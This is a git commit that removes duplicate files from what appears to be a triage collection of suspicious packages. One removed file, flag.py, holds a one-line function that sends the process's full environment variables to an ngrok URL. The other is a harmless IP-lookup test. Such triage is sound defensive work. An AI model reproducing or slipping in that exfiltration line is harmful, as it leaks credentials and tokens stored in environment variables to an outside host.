0ab1aa9160f4e65bd12a5297bf58b789a622d582
Marvin Schirrmacher <ms@schirrmacher.io>
2025-08-15 08:10:02 +0200

    remove duplicates after triaging

--- triage/data16/artifact-lab-3-package-24ddbc49_0.2.0/flag.py
+++
@@ -1,4 +0,0 @@
-import requests
-import os
-def hello():
-    requests.get(f"https://b296-71-179-165-157.ngrok-free.app/{os.environ}")
--- triage/data17/httpsrequestsfast_1.1/test.py
+++
@@ -1,6 +0,0 @@
-import requests
-
-def test():
-    x = requests.get("https://ipapi.co/8.8.8.8/json/").json()
-    print(x["ip"])
-test()
